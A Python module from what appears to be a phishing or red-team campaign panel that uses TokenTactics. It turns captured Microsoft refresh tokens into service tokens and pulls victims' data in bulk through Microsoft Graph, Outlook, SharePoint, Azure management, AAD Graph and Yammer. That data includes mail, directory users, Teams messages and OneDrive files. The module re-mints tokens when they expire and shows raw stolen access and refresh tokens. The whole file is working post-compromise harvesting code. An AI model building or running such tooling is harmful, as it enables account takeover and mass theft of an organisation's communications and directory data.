"""
Service data access layer: pulls data directly from Microsoft APIs with
minted service tokens (no pwsh involved).

Two modes:
  1. REST resources (DATA_RESOURCES) — "First N" and "Fetch All" paging
  2. JWT inspection — claim view for every service token

Special case: Teams messages are read from the pwsh-based async flow
(cached) — TokenTactics' Teams API call cannot be reproduced one-to-one
over REST, so the existing flow is reused.
"""
import json
import logging
import requests

from ..models import DeviceInfo, Log, db
from ..utils.security import decrypt_token, parse_jwt_token
from .powershell import PowerShellService, _load_service_tokens

logger = logging.getLogger(__name__)

MAX_FULL_ITEMS = 5000
MAX_FULL_PAGES = 40
REQUEST_TIMEOUT = 30

DATA_RESOURCES = {
    'msgraph': {
        'me':        {'label': 'Profile (/me)',           'path': 'https://graph.microsoft.com/v1.0/me',                'paged': False},
        'messages':  {'label': 'Mail',                'path': 'https://graph.microsoft.com/v1.0/me/messages',      'paged': True},
        'users':     {'label': 'Directory Users',     'path': 'https://graph.microsoft.com/v1.0/users',            'paged': True},
        'groups':    {'label': 'Groups',                 'path': 'https://graph.microsoft.com/v1.0/groups',           'paged': True},
        'events':    {'label': 'Calendar',                  'path': 'https://graph.microsoft.com/v1.0/me/events',        'paged': True},
        'drive':     {'label': 'OneDrive (recent files)', 'path': 'https://graph.microsoft.com/v1.0/me/drive/recent',  'paged': True},
        'chats':     {'label': 'Teams Chats',        'path': 'https://graph.microsoft.com/v1.0/me/chats',         'paged': True, 'expand': 'lastMessagePreview'},
        'sites':     {'label': 'SharePoint Sites',     'path': 'https://graph.microsoft.com/v1.0/sites',           'paged': False, 'search': True},
    },
    'outlook': {
        'me':          {'label': 'Profile (/me)',       'path': 'https://outlook.office365.com/api/v2.0/me',            'paged': False},
        'messages':    {'label': 'Mail',           'path': 'https://outlook.office365.com/api/v2.0/me/messages',     'paged': True},
        'events':      {'label': 'Calendar',             'path': 'https://outlook.office365.com/api/v2.0/me/events',       'paged': True},
        'contacts':    {'label': 'Contacts',            'path': 'https://outlook.office365.com/api/v2.0/me/contacts',     'paged': True},
        'mailfolders': {'label': 'Mail Folders',   'path': 'https://outlook.office365.com/api/v2.0/me/mailfolders',  'paged': True},
    },
    'sharepoint': {
        'sites': {'label': 'Sites (SP search)', 'path': None, 'paged': False},
    },
    'azure_mgmt': {
        'subscriptions': {'label': 'Subscriptions', 'path': 'https://management.azure.com/subscriptions?api-version=2020-01-01', 'paged': False},
    },
    'azure_core': {
        'subscriptions': {'label': 'Subscriptions', 'path': 'https://management.azure.com/subscriptions?api-version=2020-01-01', 'paged': False},
    },
    'aad_graph': {
        'me':            {'label': 'Profile (/me)',  'path': 'https://graph.windows.net/me?api-version=1.6', 'paged': False},
        'tenantdetails': {'label': 'Tenant Details', 'path': 'https://graph.windows.net/tenantDetails?api-version=1.6', 'paged': False},
    },
    'yammer': {
        'messages': {'label': 'Messages', 'path': 'https://www.yammer.com/api/v1/messages.json', 'paged': False},
    },
}


def _ensure_service_token(hostname, service_key):
    """
    Returns the service token; mints it via TokenTactics first if absent.
    Returns: (token or None, error_message or None)
    """
    device = DeviceInfo.query.filter_by(hostname=hostname).first()
    if not device:
        return None, "Device not found"
    if not device.refresh_token:
        return None, "No refresh token — waiting for authentication"

    tokens = _load_service_tokens(device)
    encrypted = tokens.get(service_key)
    if not encrypted:
        ok, msg = PowerShellService.generate_service_token(hostname, service_key)
        if not ok:
            return None, f"Token could not be minted: {msg}"
        device = DeviceInfo.query.filter_by(hostname=hostname).first()
        encrypted = _load_service_tokens(device).get(service_key)

    token = decrypt_token(encrypted) if encrypted else None
    if not token:
        return None, "Token could not be decrypted"
    return token, None


class ServiceDataService:
    """
    Pulls data from Microsoft services with minted service tokens.
    """

    @staticmethod
    def available_resources(hostname):
        """
        Resource map shown in the panel:
        {service: {resource: label}} — services with a token and a REST resource.
        """
        device = DeviceInfo.query.filter_by(hostname=hostname).first()
        if not device:
            return {}
        tokens = _load_service_tokens(device)
        if device.teams_token:
            tokens.setdefault('teams', True)

        result = {}
        for service_key, resources in DATA_RESOURCES.items():
            if service_key in tokens:
                result[service_key] = {rk: rc['label'] for rk, rc in resources.items()}

        if device.teams_token:
            result['teams'] = {'messages': 'Teams Messages'}
        return result

    @staticmethod
    def fetch_resource(hostname, service_key, resource_key, top=25, full=False):
        """
        Fetches data from a service resource.

        Args:
            top: "First N" — items per page / initial count
            full: if True, follows nextLinks to pull everything
                  (bounded by MAX_FULL_ITEMS/MAX_FULL_PAGES)

        Returns:
            dict: {items, count, truncated, raw_count} or {error}
        """
        if service_key == 'teams':
            if resource_key != 'messages':
                return {"error": "Teams supports only the 'messages' resource"}
            return ServiceDataService._fetch_teams_messages(hostname, full=full)

        if service_key == 'sharepoint':
            if resource_key != 'sites':
                return {"error": "SharePoint supports only the 'sites' resource"}
            return ServiceDataService._fetch_sharepoint_sites(hostname)

        service_resources = DATA_RESOURCES.get(service_key)
        if not service_resources:
            return {"error": f"'{service_key}' has no REST data resource — use JWT inspection"}
        resource = service_resources.get(resource_key)
        if not resource:
            return {"error": f"Unknown resource: {resource_key}"}

        from ..utils.validators import clamp_int
        top = clamp_int(top, 25, 1, 999)

        token, err = _ensure_service_token(hostname, service_key)
        if err:
            return {"error": err}

        headers = {'Authorization': f'Bearer {token}', 'Accept': 'application/json'}
        url = resource['path']
        is_search = resource.get('search', False)

        items = []
        page = 0
        next_url = None
        truncated = False

        try:
            while True:
                page += 1
                if next_url:
                    req_url = next_url
                elif resource['paged']:
                    req_url = f"{url}?$top={int(top)}"
                    if resource.get('expand'):
                        req_url += f"&$expand={resource['expand']}"
                elif is_search:
                    req_url = f"{url}?search=*"
                else:
                    req_url = url

                resp = requests.get(req_url, headers=headers, timeout=REQUEST_TIMEOUT)

                if resp.status_code == 401:
                    token, err = ServiceDataService._refresh_service_token(hostname, service_key)
                    if err:
                        return {"error": f"401 — token yenilenemedi: {err}"}
                    headers['Authorization'] = f'Bearer {token}'
                    resp = requests.get(req_url, headers=headers, timeout=REQUEST_TIMEOUT)

                if resp.status_code != 200:
                    detail = (resp.text or '')[:500]
                    return {"error": f"HTTP {resp.status_code}: {detail}"}

                data = resp.json()
                batch = data.get('value', data.get('messages')) if isinstance(data, dict) else data
                if batch is None:
                    batch = [data] if data else []
                if not isinstance(batch, list):
                    batch = [data] if data else []
                items.extend(batch)

                next_url = data.get('@odata.nextLink')
                if not full:
                    truncated = bool(next_url)
                    break
                if not next_url:
                    break
                if len(items) >= MAX_FULL_ITEMS or page >= MAX_FULL_PAGES:
                    truncated = True
                    break

            Log(hostname=hostname,
                log_message=f"Data fetch: {service_key}/{resource_key} ({len(items)} records{' full' if full else ''})")
            db.session.commit()

            return {
                "items": items[:MAX_FULL_ITEMS],
                "count": len(items),
                "truncated": truncated,
                "page_mode": "full" if full else "first"
            }

        except requests.Timeout:
            return {"error": "Request timed out (30s)"}
        except ValueError:
            return {"error": "Response could not be parsed as JSON"}
        except Exception as e:
            logger.error(f"Data fetch error {service_key}/{resource_key} for {hostname}: {e}")
            return {"error": f"Error: {str(e)}"}

    @staticmethod
    def _fetch_teams_messages(hostname, full=False):
        """
        Fetches Teams messages for the viewer. The pwsh flow is async:
        it starts the fetch if none is running and asks the user to retry;
        returns the cached content when ready. full=True (Fetch All)
        triggers a cache refresh.
        """
        ps = PowerShellService()

        result = ps.get_teams_messages(hostname, force_refresh=full)
        r = result.get('status')

        if r in ('processing', 'pending'):
            return {"error": "Teams messages are being fetched in the background (may take 1-2 min). "
                             "Please try 'Fetch First N' again shortly."}
        if r == 'error':
            return {"error": f"Teams message error: {result.get('message')}"}
        if r != 'completed':
            return {"error": f"Beklenmeyen Teams durumu: {r}"}

        import re
        raw = ps.get_teams_messages_content(hostname, formatted=False)
        if isinstance(raw, str) and raw.lstrip().startswith(('[', '{')):
            try:
                parsed = json.loads(raw)
                items = parsed if isinstance(parsed, list) else [parsed]
                return {"items": items, "count": len(items),
                        "truncated": False, "page_mode": "first"}
            except ValueError:
                pass

        text = ps.get_teams_messages_content(hostname, formatted=True)
        if not isinstance(text, str):
            text = str(text)
        text = re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', text).strip()
        return {"items": [{"raw": text}],
                "count": 1, "truncated": False, "page_mode": "first", "raw_text": True}

    @staticmethod
    def _fetch_sharepoint_sites(hostname, rowlimit=50):
        """
        Site search in the SharePoint Online tenant (_api/search).
        The tenant SP host is derived from the campaign domain
        (corp.com → corp.sharepoint.com).
        """
        token, err = _ensure_service_token(hostname, 'sharepoint')
        if err:
            return {"error": err}

        from ..utils.config import get_target_domain_for
        domain = get_target_domain_for(hostname) or ''
        sp_host = domain.split('.')[0] + '.sharepoint.com' if domain else ''
        from ..utils.validators import valid_sp_host
        if not sp_host or not valid_sp_host(sp_host):
            return {"error": "Campaign domain could not be resolved (SharePoint host cannot be derived)"}

        url = f"https://{sp_host}/_api/search/query"
        params = {
            'querytext': "'contentclass:STS_Site'",
            'rowlimit': str(rowlimit),
            'selectproperties': "'Title,Path,Description'",
        }
        headers = {
            'Authorization': f'Bearer {token}',
            'Accept': 'application/json;odata=verbose',
        }

        try:
            resp = requests.get(url, params=params, headers=headers, timeout=REQUEST_TIMEOUT)
            if resp.status_code == 401:
                token, err = ServiceDataService._refresh_service_token(hostname, 'sharepoint')
                if err:
                    return {"error": f"401 — token yenilenemedi: {err}"}
                headers['Authorization'] = f'Bearer {token}'
                resp = requests.get(url, params=params, headers=headers, timeout=REQUEST_TIMEOUT)
            if resp.status_code != 200:
                return {"error": f"HTTP {resp.status_code}: {(resp.text or '')[:300]}"}

            data = resp.json()

            def _results(node):
                """verbose OData collections are wrapped in {results: [...]}"""
                if isinstance(node, dict):
                    return node.get('results', [])
                return node or []

            relevant = (data.get('d', {}).get('query', {})
                            .get('PrimaryQueryResult', {}).get('RelevantResults', {}))
            rows = _results(relevant.get('Table', {}).get('Rows', {}))
            items = []
            for row in rows:
                item = {}
                for cell in _results(row.get('Cells', {})):
                    item[cell.get('Key')] = cell.get('Value')
                if item.get('Path') or item.get('Title'):
                    items.append(item)

            Log(hostname=hostname, log_message=f"Data fetch: sharepoint/sites ({len(items)} site)")
            db.session.commit()
            return {"items": items, "count": len(items),
                    "truncated": len(items) >= rowlimit, "page_mode": "first"}

        except requests.Timeout:
            return {"error": "Request timed out (30s)"}
        except requests.ConnectionError:
            return {"error": f"{sp_host} could not be reached — the tenant SP host "
                             "is derived from the domain prefix; the resource stays unavailable if it differs in this environment"}
        except ValueError:
            return {"error": "Response could not be parsed as JSON"}
        except Exception as e:
            logger.error(f"SharePoint sites fetch error for {hostname}: {e}")
            return {"error": f"Error: {str(e)}"}

    @staticmethod
    def _refresh_service_token(hostname, service_key):
        """Re-mints the service token on a 401."""
        ok, msg = PowerShellService.generate_service_token(hostname, service_key)
        if not ok:
            return None, msg
        device = DeviceInfo.query.filter_by(hostname=hostname).first()
        encrypted = _load_service_tokens(device).get(service_key)
        token = decrypt_token(encrypted) if encrypted else None
        if not token:
            return None, "refreshed token could not be decrypted"
        return token, None

    @staticmethod
    def inspect_token(hostname, service_key):
        """
        Token inspection: JWT claims + raw token text.
        service_key: service name, 'device' (access token) or 'refresh'.
        """
        from .powershell import TOKEN_SERVICES

        device = DeviceInfo.query.filter_by(hostname=hostname).first()
        if not device:
            return {"error": "Device not found"}

        raw_token = None
        if service_key == 'device':
            if not device.access_token:
                return {"error": "Access token yok"}
            raw_token = decrypt_token(device.access_token)
            payload = parse_jwt_token(raw_token or '')
            label = 'Cihaz access token'
        elif service_key == 'refresh':
            if not device.refresh_token:
                return {"error": "Refresh token yok"}
            raw_token = decrypt_token(device.refresh_token)
            payload = None
            label = 'Refresh token (raw)'
        else:
            if service_key not in TOKEN_SERVICES:
                return {"error": f"Bilinmeyen servis: {service_key}"}
            label = TOKEN_SERVICES[service_key]['label']
            raw_token, err = _ensure_service_token(hostname, service_key)
            if err:
                return {"error": err}
            payload = parse_jwt_token(raw_token)

        result = {"service": service_key, "label": label, "raw": raw_token}

        if payload:
            import datetime
            claims = dict(payload)
            for ts_key in ('exp', 'iat', 'nbf'):
                if isinstance(claims.get(ts_key), (int, float)):
                    claims[ts_key + '_str'] = datetime.datetime.fromtimestamp(
                        claims[ts_key]).strftime('%d.%m.%Y %H:%M:%S')
            result["claims"] = claims
        elif service_key != 'refresh':
            result["note"] = "JWT could not be parsed (may be JWE) — raw token below"

        return result
